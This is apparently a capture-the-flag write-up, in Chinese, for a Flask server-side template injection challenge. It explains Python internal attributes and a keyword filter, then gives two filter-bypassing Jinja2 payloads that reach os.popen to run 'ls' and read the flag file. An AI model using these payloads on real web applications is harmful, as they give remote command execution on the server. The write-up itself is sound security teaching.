# Week4 BabySSTI_Two 200-

## 0、知识点与工具

>   Flask SSTI模板注入

>   远程代码执行

>   工具burpsuite

>   ```java
>   回顾一下Python的内置属性
>       __class__：每个类都有的,表示当前类
>       __bases__：每一个类都有的一个属性，列出其基类
>       __mro__：列举类解析函数的执行顺序，也就是解析一个类构造函数的调用顺序
>       __subclasses__：获取所有子类集合
>       __init__：初始化一个类
>       __globals__：只读，以字典的形式返回函数所在的全局命名空间所定义的全局变量
>       __dict__：可写；以字典的形式返回命名空间所支持的任意自定义的函数属性
>       __builtins__：定义内建名称空间（Python在启动时会首先加载内建名称空间）
>       	在控制台直接输入__builtins__时（Python2）会出现__builtin__
>       __import__
>       __code__：可写；返回已编译的函数对象
>       __name__：获取函数的名称
>       __doc__：用于获取函数的文档说明，如果没有，则返回 None
>       __module__：返回函数所在的模块，如果无则返回None
>       __defaults__：以元组的形式返回函数的默认参数，如果无默认参数则返回None
>       __closure__：以包含cell的元组形式返回闭包所包含的自由变量
>       
>       
>   ```
>
>   [插眼](https://segmentfault.com/a/1190000005685090#item-7)

>   关于`__builtins__`
>
>   -   在启动Python解释器或运行一个Python程序时
>   -   内建名称空间都是从`__builtins__`模块中加载的
>   -   只是`__builtins__` 本身是对Python内建模块`__builtin__`的引用
>       -   如果是在主模块`__main__`中，`__builtins__`直接引用`__builtin__`模块，此时模块名`__builtins__`与模块名``__builtin__`指向的都是同一个模块，即`<builtin>`内建模块（这里要注意变量名和对象本身的区别）
>       -   如果不是在主模块中，那么`__builtins__`只是引用了`__builtin__.__dict__`

## 1、分析

>   flask模板注入第二弹！

>   首先页面也就是需要传入一个name参数，然后页面就会出现效果

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221120154320.png)

>   然后继续测试

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221120154344.png)

>   表达式还是执行了

>   既然是第二弹，那肯定做了过滤
>
>   比如：class、subclass、init、globals、popen、空格、等等好多

>   绕过的方法也有很多，但在这题能有用的发现有两种如：大写转小写绕过和编码绕过（感觉编码绕过是万能的）（bushi

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221120160025.png)



>   然后掏出之前的写payload加点料，然后看一下flag是否在根目录
>
>   ```bash
>   {{[123]['__CLASS__'|lower]['__MRO__'|lower][-1]['__SUBCLASSES__'|lower]()[117]['__INIT__'|lower]['__GLOBALS__'|lower]['__BUILTINS__'|lower]['__IMPORT__'|lower]('os')['POPEN'|lower]('ls%09/')['read']()}}
>   ```

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/202211201613715.png)





>   最后获取flag
>
>   ```bash
>   {{[123]['__CLASS__'|lower]['__MRO__'|lower][-1]['__SUBCLASSES__'|lower]()[117]['__INIT__'|lower]['__GLOBALS__'|lower]['__BUILTINS__'|lower]['__IMPORT__'|lower]('os')['POPEN'|lower]('tail%09/f*')['read']()}}
>   ```

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221120161145.png)

